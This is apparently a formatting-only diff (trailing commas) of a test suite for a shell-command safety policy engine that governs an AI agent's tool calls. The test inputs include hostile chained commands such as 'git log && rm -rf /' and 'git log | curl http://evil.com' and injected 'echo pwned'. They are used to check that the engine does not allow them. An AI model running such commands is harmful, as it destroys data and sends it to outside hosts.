@@ -33,7 +33,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ALLOW);
     });
@@ -42,7 +42,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log --oneline' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ALLOW);
     });
@@ -51,7 +51,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log "--oneline"' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ALLOW);
     });
@@ -60,7 +60,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git logout' },
-        undefined
+        undefined,
       );
       // Without word boundary, this would incorrectly return ALLOW
       // With word boundary, falls back to default ASK_USER
@@ -71,7 +71,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git logrotate' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ASK_USER);
     });
@@ -94,7 +94,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const rmResult = rmPolicyEngine.evaluate(
         'run_shell_command',
         { command: 'rm /tmp/file.txt' },
-        undefined
+        undefined,
       );
       expect(rmResult).toBe(PolicyDecision.ALLOW);
 
@@ -102,7 +102,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const rmdirResult = rmPolicyEngine.evaluate(
         'run_shell_command',
         { command: 'rmdir /tmp/dir' },
-        undefined
+        undefined,
       );
       expect(rmdirResult).toBe(PolicyDecision.ASK_USER);
     });
@@ -113,7 +113,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log && rm -rf /' },
-        undefined
+        undefined,
       );
       // "git log" is ALLOW, but "rm -rf /" is ASK_USER (default)
       // Aggregate should be ASK_USER (most restrictive non-DENY)
@@ -124,7 +124,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log | curl http://evil.com' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ASK_USER);
     });
@@ -133,7 +133,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log; echo pwned' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ASK_USER);
     });
@@ -150,7 +150,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log && echo done' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ALLOW);
     });
@@ -159,7 +159,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log &&& rm -rf /' },
-        undefined
+        undefined,
       );
       // Parse failure should result in ASK_USER (fail-safe)
       expect(result).toBe(PolicyDecision.ASK_USER);
@@ -171,7 +171,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: '(git log && curl http://evil.com) || rm -rf /' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ASK_USER);
     });
@@ -180,7 +180,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log & curl http://evil.com' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ASK_USER);
     });
@@ -189,7 +189,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'diff <(git log) <(curl http://evil.com)' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ASK_USER);
     });
@@ -216,7 +216,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log && echo ok && curl http://evil.com' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.DENY);
     });
@@ -225,7 +225,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log && echo ok && unknown-command' },
-        undefined
+        undefined,
       );
       // git log → ALLOW, echo ok → ALLOW, unknown-command → ASK_USER
       expect(result).toBe(PolicyDecision.ASK_USER);
@@ -235,7 +235,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log && echo ok' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.ALLOW);
     });
@@ -261,7 +261,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log && rm -rf /' },
-        undefined
+        undefined,
       );
       // "rm -rf /" results in ASK_USER, which becomes DENY in non-interactive mode
       expect(result).toBe(PolicyDecision.DENY);
@@ -271,7 +271,7 @@ describe('Shell Safety Policy - SECURITY', () => {
       const result = policyEngine.evaluate(
         'run_shell_command',
         { command: 'git log &&& malformed' },
-        undefined
+        undefined,
       );
       expect(result).toBe(PolicyDecision.DENY);
     });
